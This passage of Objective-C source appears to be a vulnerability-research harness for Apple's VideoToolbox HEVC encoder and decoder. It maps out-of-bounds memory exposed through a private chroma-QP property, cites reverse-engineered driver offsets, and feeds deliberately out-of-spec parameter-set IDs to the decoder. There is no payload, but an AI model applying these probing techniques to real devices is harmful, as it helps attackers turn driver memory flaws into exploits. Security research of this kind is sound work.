                                NSMutableArray *oob28 = [NSMutableArray arrayWithCapacity:28];
                                int aliasMatches = 0;
                                for (int wi = 0; wi < 8; wi++) {
                                    [cb8 addObject:nsPost[(NSUInteger)(2 * wi)]];
                                    [cr8 addObject:nsPost[(NSUInteger)(2 * wi + 1)]];
                                }
                                for (int wi = 8; wi < 36; wi++) {
                                    int evenVal = [nsPost[(NSUInteger)(2 * wi)] intValue];
                                    int prevOddVal = [nsPost[(NSUInteger)(2 * (wi - 8) + 1)] intValue];
                                    if (evenVal == prevOddVal) aliasMatches++;
                                    int oddVal = [nsPost[(NSUInteger)(2 * wi + 1)] intValue];
                                    prevOob[wi - 8] = oddVal;
                                    [oob28 addObject:nsPost[(NSUInteger)(2 * wi + 1)]];
                                }
                                KPH9OutAppend(log, @"  cqpStructLayout[alias=%d/28]: cb[+0x24..+0x40]=[%@] cr[+0x44..+0x60]=[%@] oob[+0x64..+0xd3]=[%@]\n",
                                              aliasMatches,
                                              [cb8 componentsJoinedByString:@","],
                                              [cr8 componentsJoinedByString:@","],
                                              [oob28 componentsJoinedByString:@","]);
                            }
                        }
                        CFRelease(rbPost);
                    }
                    // Check whether setting writable HEVC session properties post-EncodeFrame modifies cr[7] (pps[0]+0x60..0x63)
                    // or oob[0..27] (pps[0]+0x64..0xd3):
                    // Note: AVE_HEVC_SetQuality (0x54d9798) only sets pps[0]+0x63 = 1 when w22 == 100 (Quality == 1.0)!
                    NSArray *candPairs = @[
                        @[ @"Quality",                 @0.25 ],
                        @[ @"Quality",                 @0.75 ],
                        @[ @"Quality",                 @1.0 ],
                        @[ @"HwFeatureOn",             @8 ],
                        @[ @"HwFeatureOff",            @8 ],
                        @[ @"AlgFeatureOn",            @1 ],
                        @[ @"GOPFeatureOn",            @1 ],
                        @[ @"RCFeatureOn",             @1 ],
                        @[ @"SEIFeatureOn",            @1 ],
                        @[ @"VUIFeatureOn",            @1 ],
                        @[ @"AllowFrameReordering",    (id)kCFBooleanFalse ],
                        @[ @"AllowOpenGOP",            (id)kCFBooleanFalse ],
                        @[ @"AllowTemporalCompression",(id)kCFBooleanFalse ],
                        @[ @"RealTime",                (id)kCFBooleanFalse ],
                        @[ @"OutputBitDepth",            @10 ],
                        @[ @"SoftMaxQuantizationParameter", @42 ],
                        @[ @"SoftMinQuantizationParameter", @18 ],
                        @[ @"MaxAllowedFrameQP",         @45 ],
                        @[ @"MinAllowedFrameQP",         @15 ],
                        @[ @"QuantizationScalingMatrixPreset", @1 ],
                        @[ @"SpatialAdaptiveQPLevel",    @0 ],
                        @[ @"EnableUserQPMap",           (id)kCFBooleanTrue ],
                        @[ @"EnableWeightedPrediction",  (id)kCFBooleanTrue ],
                        @[ @"TemporalIDNestingFlag",     (id)kCFBooleanTrue ],
                        @[ @"EnableVUIBitstreamRestriction", (id)kCFBooleanTrue ],
                        @[ @"ForceRefUncompressed",      (id)kCFBooleanTrue ],
                        @[ @"DroppablePFramesOnly",      (id)kCFBooleanTrue ],
                        @[ @"RequiredHEVCSequenceParameterSetID", @7 ],
                        @[ @"RequiredHEVCPictureParameterSetID",  @11 ],
                        @[ @"RequiredHEVCSequenceParameterSetRepFormatIndex", @2 ],
                        @[ @"RequiredHEVCVideoParameterSetAlphaLayerID", @3 ],
                        @[ @"log2_max_minus4",           @6 ],
                        @[ @"EncodesAuxiliaryWithAuxID", @5 ],
                        @[ @"NumberOfSlices",            @4 ],
                        @[ @"MultiReferencePSpacing",    @3 ],
                        @[ @"LookAheadFrames",           @8 ],
                        @[ @"NumberOfTemporalLayers",    @3 ],
                        @[ @"EnableMCTF",                (id)kCFBooleanTrue ],
                        @[ @"MCTFLatencyMode",           @1 ],
                        @[ @"EncodesAlpha",              (id)kCFBooleanTrue ],
                        @[ @"EncodesDepth",              (id)kCFBooleanTrue ],
                        @[ @"EncodesDisparity",          (id)kCFBooleanTrue ],
                        @[ @"VideoResolutionAdaptation", (id)kCFBooleanTrue ],
                        @[ @"ReferenceBufferCount",      @4 ],
                        @[ @"MaxKeyFrameInterval",       @60 ],
                        @[ @"ExpectedFrameRate",         @60 ],
                        @[ @"BaseLayerFrameRate",        @15 ],
                        @[ @"AverageBitRate",            @2000000 ],
                        @[ @"MVHEVCViewIDs",             @[ @0, @1 ] ],
                        @[ @"MVHEVCLeftAndRightViewIDs", @[ @0, @1 ] ],
                        @[ @"RequiredHEVCVideoParameterSetRepFormatBitDepths", @[ @8, @10 ] ],
                        @[ @"RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs", @[ @1, @2 ] ],
                    ];
                    NSMutableArray *diffHits = [NSMutableArray array];
                    for (NSArray *cp in candPairs) {
                        NSString *kName = cp[0];
                        id kVal = cp[1];
                        OSStatus stSet = VTSessionSetProperty(mapS, (__bridge CFStringRef)kName, (__bridge CFTypeRef)kVal);
                        CFTypeRef rbCand = NULL;
                        if (VTSessionCopyProperty(mapS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbCand) == noErr && rbCand) {
                            if (CFGetTypeID(rbCand) == CFArrayGetTypeID()) {
                                NSArray *nsCand = (__bridge NSArray *)rbCand;
                                if (nsCand.count >= 72) {
                                    int curCr7 = [nsCand[15] intValue];
                                    int curAlias30 = [nsCand[30] intValue];
                                    if (curCr7 != prevCr7) {
                                        [diffHits addObject:[NSString stringWithFormat:@"%@=%@(st=%d):cr[7]/ns[30](pps+0x60..0x63):%d->%d(0x%08x,alias30=0x%08x)",
                                                             kName, kVal, (int)stSet, prevCr7, curCr7, (unsigned)curCr7, (unsigned)curAlias30]];
                                        prevCr7 = curCr7;
                                    }
                                    for (int wi = 0; wi < 28; wi++) {
                                        int v = [nsCand[(NSUInteger)(2 * (wi + 8) + 1)] intValue];
                                        if (v != prevOob[wi]) {
                                            [diffHits addObject:[NSString stringWithFormat:@"%@=%@(st=%d):oob[%d](pps+0x%02x):%d->%d(0x%08x)",
                                                                 kName, kVal, (int)stSet, wi, 0x64 + wi * 4, prevOob[wi], v, (unsigned)v]];
                                            prevOob[wi] = v;
                                        }
                                    }
                                }
                            }
                            CFRelease(rbCand);
                        }
                    }
                    KPH9OutAppend(log, @"  cqpOobSweep[props=%lu]: hits=%lu [%@]\n",
                                  (unsigned long)candPairs.count, (unsigned long)diffHits.count, [diffHits componentsJoinedByString:@", "]);
                    VTSessionSetProperty(mapS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                    @synchronized ([KPH9EncoderModule class]) { mapRes->closed = 1; }
                    KPH9SafeTeardownEx(mapS, NULL, mapRes);
                } else if (mapRes) {
                    free(mapRes);
                }
                if (pxHold) CVPixelBufferRelease(pxHold);
                dispatch_semaphore_signal(mapSem);
            });
            if (dispatch_semaphore_wait(mapSem, dispatch_time(DISPATCH_TIME_NOW, 1200 * (int64_t)NSEC_PER_MSEC)) != 0) {
                KPH9OutAppend(log, @"  cqpOobMap: timed out (>1200ms)\n");
            }
        }

        // Verify AVE_HEVC_SetQuality (0x54d9798) with Quality=1.0 (w22 == 100 == 0x64 -> strb w9, [x19 + 0x7063] = 1,
        // transquant_bypass_enabled_flag) set AFTER cqpSeed16 and BEFORE PrepareToEncodeFrames + EncodeFrame:
        //   - cqpSeed16[15] (w14=8 odd) writes 4 (0x00000004) to x19 + 0x7060..0x7063 (cr[7] = nsQ[15] and alias nsQ[30]).
        //   - Quality=1.0 sets byte +0x7063 = 1, mutating cr[7] (nsQ[15]) and nsQ[30] to 0x01000004 (16777220) and emitting
        //     transquant_bypass_enabled_flag=1 in the encoded PPS NALU!
        {
            NSMutableArray *pArr21 = [NSMutableArray arrayWithCapacity:21];
            for (int k = 0; k < 21; k++) [pArr21 addObject:@((k < 2) ? (k + 1) : (k - 1))];
            NSArray *cqpSeed16 = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                    @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
            dispatch_semaphore_t qSem = dispatch_semaphore_create(0);
            CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                Stage6ProbeResult *qRes = Stage6AllocResult();
                VTCompressionSessionRef qS = NULL;
                if (qRes && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                       NULL, NULL, NULL, Stage6OutputCallback, qRes, &qS) == noErr && qS) {
                    KPH9PrimeRealTime(qS);
                    VTSessionSetProperty(qS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);
                    OSStatus stQ = VTSessionSetProperty(qS, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
                    OSStatus prepQ = VTCompressionSessionPrepareToEncodeFrames(qS);
                    OSStatus encQ = VTCompressionSessionEncodeFrame(qS, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (qRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    OSStatus post21Q = VTSessionSetProperty(qS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                    CFTypeRef rbQ = NULL;
                    if (VTSessionCopyProperty(qS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbQ) == noErr && rbQ) {
                        if (CFGetTypeID(rbQ) == CFArrayGetTypeID()) {
                            NSArray *nsQ = (__bridge NSArray *)rbQ;
                            if (nsQ.count >= 72) {
                                int cr7Val = [nsQ[15] intValue];
                                int alias30Val = [nsQ[30] intValue];
                                NSMutableArray *oob28 = [NSMutableArray arrayWithCapacity:28];
                                for (int wi = 8; wi < 36; wi++) {
                                    [oob28 addObject:nsQ[(NSUInteger)(2 * wi + 1)]];
                                }
                                NSString *cbStr = nil;
                                @synchronized ([KPH9EncoderModule class]) {
                                    cbStr = [NSString stringWithUTF8String:qRes->first] ?: @"(no cb)";
                                }
                                KPH9OutAppend(log, @"  cqpOobQualityMap[q1.0=%d,prep=%d,enc=%d,cb=%d,ps21=%d]: cr[7]=%d(0x%08x,ns[30]=0x%08x) oob[+0x64..+0xd3]=[%@] | %@\n",
                                              (int)stQ, (int)prepQ, (int)encQ, qRes->cbCount, (int)post21Q,
                                              cr7Val, (unsigned)cr7Val, (unsigned)alias30Val,
                                              [oob28 componentsJoinedByString:@","], cbStr);
                            }
                        }
                        CFRelease(rbQ);
                    }
                    VTSessionSetProperty(qS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                    @synchronized ([KPH9EncoderModule class]) { qRes->closed = 1; }
                    KPH9SafeTeardownEx(qS, NULL, qRes);
                } else if (qRes) {
                    free(qRes);
                }
                if (pxHold) CVPixelBufferRelease(pxHold);
                dispatch_semaphore_signal(qSem);
            });
            if (dispatch_semaphore_wait(qSem, dispatch_time(DISPATCH_TIME_NOW, 900 * (int64_t)NSEC_PER_MSEC)) != 0) {
                KPH9OutAppend(log, @"  cqpOobQualityMap: timed out (>900ms)\n");
            }
        }

        // Verify PPS setup at 0x54fcdf8..0x54fce04 (ldr x9, [x19, #0x2b8]; tst x9, #8; cset w9, eq; strb w9, [x8, #0x65]):
        // Setting PropertyMode=@1 + HwFeatureOn=@8 sets bit 3 (0x8) in [x19 + 0x2b8] (via 0x55ca27c and 0x55274b8),
        // so during EncodeFrame 0x54fce04 writes 0 to x19 + 0x7065 (pps[0].entropy_coding_sync_enabled_flag),
        // flipping oob[0] (ns[17] and alias ns[32], at x19 + 0x7064..0x7067) from 256 (0x00000100) to 0 (0x00000000)!
        {
            NSMutableArray *pArr10 = [NSMutableArray arrayWithCapacity:10];
            for (int k = 0; k < 10; k++) [pArr10 addObject:@((k < 2) ? (k + 1) : (k - 1))];
            NSMutableArray *pArr21 = [NSMutableArray arrayWithCapacity:21];
            for (int k = 0; k < 21; k++) [pArr21 addObject:@((k < 2) ? (k + 1) : (k - 1))];
            NSArray *cqpSeed16 = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                    @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
            dispatch_semaphore_t m10Sem = dispatch_semaphore_create(0);
            CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                Stage6ProbeResult *m10Res = Stage6AllocResult();
                VTCompressionSessionRef m10S = NULL;
                NSDictionary *uSpec10 = @{ @"EnableUserRefForFacetime": @YES };
                if (m10Res && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                         (__bridge CFDictionaryRef)uSpec10, NULL, NULL,
                                                         Stage6OutputCallback, m10Res, &m10S) == noErr && m10S) {
                    VTSessionSetProperty(m10S, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                    KPH9PrimeRealTime(m10S);
                    OSStatus stPm = VTSessionSetProperty(m10S, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                    OSStatus stHw8 = VTSessionSetProperty(m10S, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
                    long long rbHwVal = -1;
                    CFNumberRef rbHw = NULL;
                    if (VTSessionCopyProperty(m10S, CFSTR("HwFeatureOn"), kCFAllocatorDefault, &rbHw) == noErr && rbHw) {
                        CFNumberGetValue(rbHw, kCFNumberSInt64Type, &rbHwVal);
                        CFRelease(rbHw);
                    }
                    VTSessionSetProperty(m10S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);
                    VTSessionSetProperty(m10S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr10);
                    VTSessionSetProperty(m10S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);
                    OSStatus stQ10 = VTSessionSetProperty(m10S, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
                    OSStatus prep10St = VTCompressionSessionPrepareToEncodeFrames(m10S);
                    OSStatus enc10St = VTCompressionSessionEncodeFrame(m10S, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (m10Res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    OSStatus post21St = VTSessionSetProperty(m10S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                    CFTypeRef rb10 = NULL;
                    if (VTSessionCopyProperty(m10S, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rb10) == noErr && rb10) {
                        if (CFGetTypeID(rb10) == CFArrayGetTypeID()) {
                            NSArray *ns10 = (__bridge NSArray *)rb10;
                            if (ns10.count >= 72) {
                                int cr7Val = [ns10[15] intValue];
                                int alias30Val = [ns10[30] intValue];
                                int oob0Val = [ns10[17] intValue];
                                int alias32Val = [ns10[32] intValue];
                                NSMutableArray *oob28 = [NSMutableArray arrayWithCapacity:28];
                                for (int wi = 8; wi < 36; wi++) {
                                    [oob28 addObject:ns10[(NSUInteger)(2 * wi + 1)]];
                                }
                                NSString *cbStr = nil;
                                @synchronized ([KPH9EncoderModule class]) {
                                    cbStr = [NSString stringWithUTF8String:m10Res->first] ?: @"(no cb)";
                                }
                                KPH9OutAppend(log, @"  cqpOobMapPlen10[pm=%d,hw8=%d(rb=0x%llx),q1.0=%d,prep=%d,enc=%d,cb=%d,ps21=%d]: cr[7]=0x%08x(ns[30]=0x%08x) oob[0]=%d(ns[32]=%d) oob[+0x64..+0xd3]=[%@] | %@\n",
                                              (int)stPm, (int)stHw8, rbHwVal, (int)stQ10, (int)prep10St, (int)enc10St, m10Res->cbCount, (int)post21St,
                                              (unsigned)cr7Val, (unsigned)alias30Val, oob0Val, alias32Val, [oob28 componentsJoinedByString:@","], cbStr);
                            }
                        }
                        CFRelease(rb10);
                    }
                    VTSessionSetProperty(m10S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                    @synchronized ([KPH9EncoderModule class]) { m10Res->closed = 1; }
                    KPH9SafeTeardownEx(m10S, NULL, m10Res);
                } else if (m10Res) {
                    free(m10Res);
                }
                if (pxHold) CVPixelBufferRelease(pxHold);
                dispatch_semaphore_signal(m10Sem);
            });
            if (dispatch_semaphore_wait(m10Sem, dispatch_time(DISPATCH_TIME_NOW, 900 * (int64_t)NSEC_PER_MSEC)) != 0) {
                KPH9OutAppend(log, @"  cqpOobMapPlen10: timed out (>900ms)\n");
            }
        }
    }

    // Pre-prime:
    //   1) 2-layer 39-byte VPS (sps=5, pps=9, alpha=3 -> captureSlot=1)
    //   2) Out-of-spec sps=64 with valid pps=9 (sps=64 > 15, pps=9, alpha=3 -> captureSlot=2, 30B SPS / 10B PPS)
    //   3) Valid sps=5 with out-of-spec pps=64 (sps=5, pps=64 > 63, alpha=3 -> captureSlot=3, 29B SPS / 9B PPS)
    //   4) Valid sps=5 with out-of-spec pps=127 (sps=5, pps=127, alpha=3 -> captureSlot=4, 29B SPS / 10B PPS)
    //   5) Sign-extended 37-byte SPS / 17-byte PPS (sps=128 -> 0xffffff80 in WriteUE, pps=9 -> captureSlot=5)
    //   6) Out-of-spec sps=63 (>15 H.265 limit, yet accepted by VTDecompressionSessionCreate!) + pps=63 (captureSlot=6)
    // BEFORE 7F so VTDecompressionSession can audit all 7 bitstreams independently.
    {
        int primeCfg[7][4] = {
            { 5,   9,   3, 1 },
            { 64,  9,   3, 2 },
            { 5,   64,  3, 3 },
            { 5,   127, 3, 4 },
            { 128, 9,   3, 5 },
            { 63,  63,  3, 6 },
            { 15,  63,  3, 7 },
        };
        for (int pi = 0; pi < 7; pi++) {
            Stage6ProbeResult *preRes = Stage6AllocResult();
            VTCompressionSessionRef preS = NULL;
            if (preRes) preRes->captureSlot = primeCfg[pi][3];
            if (preRes && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                     NULL, NULL, NULL, Stage6OutputCallback, preRes, &preS) == noErr && preS) {
                KPH9PrimeRealTime(preS);
                VTSessionSetProperty(preS, CFSTR("RequiredHEVCSequenceParameterSetID"), (__bridge CFNumberRef)@(primeCfg[pi][0]));
                VTSessionSetProperty(preS, CFSTR("RequiredHEVCPictureParameterSetID"), (__bridge CFNumberRef)@(primeCfg[pi][1]));
                VTSessionSetProperty(preS, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), (__bridge CFNumberRef)@(primeCfg[pi][2]));
                VTCompressionSessionPrepareToEncodeFrames(preS);
                VTCompressionSessionEncodeFrame(preS, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (preRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                @synchronized ([KPH9EncoderModule class]) { preRes->closed = 1; }
                KPH9SafeTeardownEx(preS, NULL, preRes);
            } else if (preRes) {
                free(preRes);
            }
        }
    }

    // 7F: VTDecompressionSession RequestedMVHEVCVideoLayerIDs validation & DecodeFrame audit
    // Tests 1-layer (26B VPS), 2-layer (39B VPS, alpha=3), Sps63P63 (out-of-spec sps_id=63 > 15, pps_id=63),
    // Sps64 (sps_id=64, pps_id=9), Pps64 (sps_id=5, pps_id=64), Pps127 (sps_id=5, pps_id=127), and sign-extended sps=128 (37B SPS / 17B PPS),
    // including MultiImageCapableOutputHandler (resolving -17699 when layer 0 is requested) and cross-format / hybrid
    // parameter-set & VCL slice rewrite when VTDecompressionSessionCreate rejects the format description.
    KPH9OutAppend(log, @"  [7F: VTDecompressionSession RequestedMVHEVCVideoLayerIDs Validation & DecodeFrame Audit]\n");
    {
        CMFormatDescriptionRef fmt1 = NULL, fmt2 = NULL, fmtS15P63 = NULL, fmtS63P63 = NULL, fmtS64 = NULL, fmtP64 = NULL, fmtP127 = NULL, fmt3 = NULL;
        CMSampleBufferRef sbuf1 = NULL, sbuf2 = NULL, sbufS15P63 = NULL, sbufS63P63 = NULL, sbufS64 = NULL, sbufP64 = NULL, sbufP127 = NULL, sbuf3 = NULL;
        @synchronized ([KPH9EncoderModule class]) {
            if (gLastCapturedHEVCFmt) fmt1 = (CMFormatDescriptionRef)CFRetain(gLastCapturedHEVCFmt);
            if (gLastCapturedHEVCSampleBuffer) sbuf1 = (CMSampleBufferRef)CFRetain(gLastCapturedHEVCSampleBuffer);
            if (gLastCapturedAlphaHEVCFmt) fmt2 = (CMFormatDescriptionRef)CFRetain(gLastCapturedAlphaHEVCFmt);
            if (gLastCapturedAlphaHEVCSbuf) sbuf2 = (CMSampleBufferRef)CFRetain(gLastCapturedAlphaHEVCSbuf);
            if (gLastCapturedSps15P63HEVCFmt) fmtS15P63 = (CMFormatDescriptionRef)CFRetain(gLastCapturedSps15P63HEVCFmt);
            if (gLastCapturedSps15P63HEVCSbuf) sbufS15P63 = (CMSampleBufferRef)CFRetain(gLastCapturedSps15P63HEVCSbuf);
            if (gLastCapturedSps63P63HEVCFmt) fmtS63P63 = (CMFormatDescriptionRef)CFRetain(gLastCapturedSps63P63HEVCFmt);
            if (gLastCapturedSps63P63HEVCSbuf) sbufS63P63 = (CMSampleBufferRef)CFRetain(gLastCapturedSps63P63HEVCSbuf);
            if (gLastCapturedSps64HEVCFmt) fmtS64 = (CMFormatDescriptionRef)CFRetain(gLastCapturedSps64HEVCFmt);
            if (gLastCapturedSps64HEVCSbuf) sbufS64 = (CMSampleBufferRef)CFRetain(gLastCapturedSps64HEVCSbuf);
            if (gLastCapturedPps64HEVCFmt) fmtP64 = (CMFormatDescriptionRef)CFRetain(gLastCapturedPps64HEVCFmt);
            if (gLastCapturedPps64HEVCSbuf) sbufP64 = (CMSampleBufferRef)CFRetain(gLastCapturedPps64HEVCSbuf);
            if (gLastCapturedPps127HEVCFmt) fmtP127 = (CMFormatDescriptionRef)CFRetain(gLastCapturedPps127HEVCFmt);
            if (gLastCapturedPps127HEVCSbuf) sbufP127 = (CMSampleBufferRef)CFRetain(gLastCapturedPps127HEVCSbuf);
            if (gLastCapturedSps128HEVCFmt) fmt3 = (CMFormatDescriptionRef)CFRetain(gLastCapturedSps128HEVCFmt);
            if (gLastCapturedSps128HEVCSbuf) sbuf3 = (CMSampleBufferRef)CFRetain(gLastCapturedSps128HEVCSbuf);
        }
        if (!fmt1) {
            CMVideoFormatDescriptionCreate(kCFAllocatorDefault, kCMVideoCodecType_HEVC, 192, 144, NULL, &fmt1);
        }

        // Probe VTDecompressionSessionDecodeFrameWithMultiImageCapableOutputHandler via dlsym to verify that -17699
        // on RequestedMVHEVCVideoLayerIDs c[0] / c[0,3] is kVTMultiImageCallbackNotSetErr and decodes to a CMTaggedBufferGroup!
        typedef void (^KPMultiImageCapableHandler)(OSStatus status, VTDecodeInfoFlags infoFlags,
                                                   CVImageBufferRef imageBuffer, CFTypeRef taggedBufferGroup,
                                                   CMTime pts, CMTime dur);
        typedef OSStatus (*KPDecodeMultiImageFn)(VTDecompressionSessionRef session, CMSampleBufferRef sbuf,
                                                 VTDecodeFrameFlags decodeFlags, VTDecodeInfoFlags *infoFlagsOut,
                                                 KPMultiImageCapableHandler handler);
        typedef CFIndex (*KPTBGGetCountFn)(CFTypeRef group);
        typedef CVPixelBufferRef (*KPTBGGetPixBufFn)(CFTypeRef group, CFIndex idx);
        KPDecodeMultiImageFn fnMultiDec = (KPDecodeMultiImageFn)dlsym(RTLD_DEFAULT,
            "VTDecompressionSessionDecodeFrameWithMultiImageCapableOutputHandler");
        KPTBGGetCountFn fnTbgCount = (KPTBGGetCountFn)dlsym(RTLD_DEFAULT, "CMTaggedBufferGroupGetCount");
        KPTBGGetPixBufFn fnTbgPix = (KPTBGGetPixBufFn)dlsym(RTLD_DEFAULT, "CMTaggedBufferGroupGetCVPixelBufferAtIndex");

        NSMutableArray *seq64 = [NSMutableArray arrayWithCapacity:64];
        NSMutableArray *seq300 = [NSMutableArray arrayWithCapacity:300];
        for (int i = 0; i < 64; i++) [seq64 addObject:@(i)];
        for (int i = 0; i < 300; i++) [seq300 addObject:@(i)];

        if (fnMultiDec) {
            CMFormatDescriptionRef miFmts[3] = { fmt1, fmt2, fmtS15P63 };
            CMSampleBufferRef miSbufs[3] = { sbuf1, sbuf2, sbufS15P63 };
            const char *miNames[3] = { "1Layer(vps=26)", "2Layer(vps=39,alpha=3)", "Sps15P63(sps=29,pps=10,id=15/63)" };
            NSArray *miCases = @[
                @[ @"mi[0]",      @[ @0 ] ],
                @[ @"mi[0,3]",    @[ @0, @3 ] ],
                @[ @"mi[3]",      @[ @3 ] ],
                @[ @"mi[0,64]",   @[ @0, @64 ] ],
                @[ @"mi[0..63]",  seq64 ],
                @[ @"mi[0..299]", seq300 ],
            ];
            for (int mfi = 0; mfi < 3; mfi++) {
                if (!miFmts[mfi] || !miSbufs[mfi]) continue;
                NSMutableArray *miParts = [NSMutableArray array];
                for (NSArray *mc in miCases) {
                    NSString *mTag = mc[0];
                    NSArray *mIds = mc[1];
                    VTDecompressionSessionRef mds = NULL;
                    OSStatus mCreateSt = VTDecompressionSessionCreate(kCFAllocatorDefault, miFmts[mfi], NULL, NULL, NULL, &mds);
                    if (mCreateSt == noErr && mds) {
                        OSStatus mSet = VTSessionSetProperty(mds, CFSTR("RequestedMVHEVCVideoLayerIDs"), (__bridge CFTypeRef)mIds);
                        VTDecodeInfoFlags mInfo = 0;
                        __block OSStatus mCbSt = -998;
                        __block int mImg = 0, mTbgCnt = 0, mTbgPx = 0;
                        dispatch_semaphore_t mSem = dispatch_semaphore_create(0);
                        OSStatus mCallSt = fnMultiDec(mds, miSbufs[mfi], 0, &mInfo,
                            ^(OSStatus status, VTDecodeInfoFlags infoFlags, CVImageBufferRef imageBuffer,
                              CFTypeRef taggedBufferGroup, CMTime pts, CMTime dur) {
                                (void)infoFlags; (void)pts; (void)dur;
                                mCbSt = status;
                                mImg = (imageBuffer != NULL) ? 1 : 0;
                                if (taggedBufferGroup != NULL) {
                                    mTbgCnt = fnTbgCount ? (int)fnTbgCount(taggedBufferGroup) : 1;
                                    if (fnTbgPix && mTbgCnt > 0) {
                                        for (int ti = 0; ti < mTbgCnt; ti++) {
                                            if (fnTbgPix(taggedBufferGroup, ti) != NULL) mTbgPx++;
                                        }
                                    }
                                }
                                dispatch_semaphore_signal(mSem);
                            });
                        dispatch_semaphore_wait(mSem, dispatch_time(DISPATCH_TIME_NOW, 250 * (int64_t)NSEC_PER_MSEC));
                        [miParts addObject:[NSString stringWithFormat:@"%@=%d(dec=%d/%d,img=%d,tbg=%d/%d)",
                                            mTag, (int)mSet, (int)mCallSt, (int)mCbSt, mImg, mTbgCnt, mTbgPx]];
                        VTDecompressionSessionInvalidate(mds);
                        CFRelease(mds);
                    } else {
                        [miParts addObject:[NSString stringWithFormat:@"%@=noDec(%d)", mTag, (int)mCreateSt]];
                    }
                }
                KPH9OutAppend(log, @"  decMultiImage[%s]: %@\n", miNames[mfi], [miParts componentsJoinedByString:@" "]);
            }
        }
        NSArray *decCases = @[
            @[ @"c[none]",    [NSNull null] ],
            @[ @"c[0]",       @[ @0 ] ],
            @[ @"c[0,1]",     @[ @0, @1 ] ],
            @[ @"c[0,3]",     @[ @0, @3 ] ],
            @[ @"c[3,0]",     @[ @3, @0 ] ],
            @[ @"c[1,3]",     @[ @1, @3 ] ],
            @[ @"c[3]",       @[ @3 ] ],
            @[ @"c[63]",      @[ @63 ] ],
            @[ @"c[64]",      @[ @64 ] ],
            @[ @"c[63,64]",   @[ @63, @64 ] ],
            @[ @"c[0,64]",    @[ @0, @64 ] ],
            @[ @"c[0..63]",   seq64 ],
            @[ @"c[0..299]",  seq300 ],
            @[ @"c[-1]",      @[ @(-1) ] ],
        ];
        CMFormatDescriptionRef fmts[8] = { fmt1, fmt2, fmtS15P63, fmtS63P63, fmtS64, fmtP64, fmtP127, fmt3 };
        CMSampleBufferRef sbufs[8] = { sbuf1, sbuf2, sbufS15P63, sbufS63P63, sbufS64, sbufP64, sbufP127, sbuf3 };
        const char *streamTags[8] = {
            "1Layer(vps=26)",
            "2Layer(vps=39,alpha=3)",
            "Sps15P63(sps=29,pps=10,id=15/63)",
            "Sps63P63(sps=30,pps=10,id=63/63)",
            "Sps64(sps=30,pps=10,id=64/9)",
            "Pps64(sps=29,pps=9,id=5/64)",
            "Pps127(sps=29,pps=10,id=5/127)",
            "Sps128(sps=37,pps=17,id=128/9)"
        };
        for (int si = 0; si < 8; si++) {
            if (!fmts[si]) continue;
            NSMutableArray *decParts = [NSMutableArray array];
            NSString *decSuppStr = @"none";
            for (size_t dci = 0; dci < decCases.count; dci++) {
                NSArray *dc = decCases[dci];
                NSString *tag = dc[0];
                id idsObj = dc[1];
                VTDecompressionSessionRef ds = NULL;
                OSStatus dsSt = VTDecompressionSessionCreate(kCFAllocatorDefault, fmts[si], NULL, NULL, NULL, &ds);
                if (dsSt == noErr && ds) {
                    if (dci == 0 && si == 0) {
                        CFDictionaryRef dsupp = NULL;
                        if (VTSessionCopySupportedPropertyDictionary(ds, &dsupp) == noErr && dsupp) {
                            NSDictionary *nsDsupp = (__bridge NSDictionary *)dsupp;
                            NSMutableArray *mKeys = [NSMutableArray array];
                            for (NSString *dk in [[nsDsupp allKeys] sortedArrayUsingSelector:@selector(compare:)]) {
                                NSString *dkl = [dk lowercaseString];
                                if ([dkl containsString:@"mvhevc"] || [dkl containsString:@"layer"] ||
                                    [dkl containsString:@"dpb"] || [dkl containsString:@"rps"]) {
                                    [mKeys addObject:dk];
                                }
                            }
                            decSuppStr = [NSString stringWithFormat:@"total=%lu match=[%@]",
